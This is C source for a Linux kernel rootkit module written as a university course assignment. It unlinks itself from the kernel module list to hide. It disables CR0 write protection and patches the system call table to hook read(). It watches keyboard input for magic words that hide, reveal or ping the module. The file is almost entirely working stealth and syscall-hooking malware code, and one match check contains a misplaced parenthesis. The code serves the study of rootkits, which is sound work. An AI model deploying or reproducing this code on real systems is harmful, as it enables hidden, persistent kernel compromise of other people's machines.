
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>

#include "module_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */

MODULE_LICENSE("GPL");

static int heartbeat_matched_so_far;	/* Characters of HEARTBEAT matched so far */
static int voila_matched_so_far;		/* Characters of VOILA matched so far */
static int hocus_pocus_matched_so_far;	/* Characters of HOCUS_POCUS matched so far */
static int delmod_matched_so_far;		/* Characters of DELMOD matched so far */

static char anchor_mod_name[MAX_MOD_NAME_SIZE];
static int hidden;

static void hide_module(void)
{
	struct module *next_mod = NULL;

	if (hidden) {
		printk(KERN_INFO "Module already hidden!");
		return;
	}

	next_mod = list_entry(THIS_MODULE->list.next, struct module, list);

	list_del(&(THIS_MODULE->list));
	printk(KERN_INFO "Module hidden! Type %s to make it visible again", VOILA);
	hidden = 1;

	if (next_mod == THIS_MODULE || next_mod == NULL) {
		printk(KERN_INFO "We have a problem, there is no other module\n");
		return;
	}

	strcpy(anchor_mod_name, next_mod->name);

	printk(KERN_INFO "NEXT: %s", anchor_mod_name);
}

static void reveal_module(void)
{
	struct module *anchor_mod = NULL;

	if (hidden == 0) {
		printk(KERN_INFO "Module already visible!\n");
		return;
	}

	anchor_mod = find_module(anchor_mod_name);

	if (anchor_mod == NULL) {
		printk(KERN_INFO "Anchor not found, we are truly sad.\n");
		return;
	}

	list_add_tail(&(THIS_MODULE->list), &(anchor_mod->list));
	printk(KERN_INFO "STUFF: Module is visible! Type %s to make it dissapear again\n", HOCUS_POCUS);

	hidden = 0;
}

static void delete_module(void)
{
	reveal_module();

	set_fs(KERNEL_DS);
	/* Not really good we need to do this somehow without returning */
	delete_module_syscall(THIS_MODULE->name, (O_NONBLOCK | O_TRUNC));
}

/* Function that replaces the original read_syscall. In addition to what
   read_syscall does, it also ... */
asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	int matches_count;
	int i;

	/* Call original read_syscall */
	ret = read_syscall(fd, buf, count);

	/* If the read was not from STDIN don't do anything */
	if (fd != 0)
		return ret;

	if ((matches_count = count_matches(buf, HEARTBEAT, &heartbeat_matched_so_far) > 0))
		for (i = 0 ; i < matches_count; i++)
			printk(KERN_INFO "module_masker rootkit: %s\n", HEARTBEAT_RESPONSE);

	if ((matches_count = count_matches(buf, VOILA, &voila_matched_so_far)) > 0) {
		printk(KERN_INFO "module_masker rootkit: %s\n", VOILA);
		reveal_module();
	}

	if ((matches_count = count_matches(buf, HOCUS_POCUS, &hocus_pocus_matched_so_far)) > 0) {
		printk(KERN_INFO "module_masker rootkit: %s\n", HOCUS_POCUS);
		hide_module();
	}

/*
	if ((matches_count = count_matches(buf, DELMOD, &delmod_matched_so_far)) > 0) {
		printk(KERN_INFO "module_masker rootkit: %s\n", DELMOD);
		delete_module();
	}
*/
	return ret;
}


int count_matches(char *buf, char *command, int *chars_matched_so_far)
{
	int matches;
	int i;

	/* Match the command */
	matches = i = 0;
	while (i < strlen(buf)) {
		if (command[(*chars_matched_so_far)++] != buf[i++])
			*chars_matched_so_far = 0;

		if (strlen(command) == *chars_matched_so_far) {
			*chars_matched_so_far = 0;
			matches++;
		}
	}

	return matches;
}


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init module_masker_start(void)
{
	heartbeat_matched_so_far = voila_matched_so_far = 0;
	hocus_pocus_matched_so_far = 0;

	hide_module();

	disable_write_protect_mode();

	/* Store original read() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	read_syscall = (void *) sys_call_table[__NR_read];
	delete_module_syscall = (void *) sys_call_table[__NR_delete_module];

	/* Replace in the system call table the original
	   read() syscall with our intercepting function */
	sys_call_table[__NR_read] = (unsigned long *) my_read_syscall;

	/* Enable `write-protect` mode */
	enable_write_protect_mode();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
static void __exit module_masker_end(void)
{
	disable_write_protect_mode();

	/* Restore original read() syscall */
	sys_call_table[__NR_read] = (unsigned long *) read_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "module_masker rootkit: %s\n", "successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


module_init(module_masker_start);
module_exit(module_masker_end);
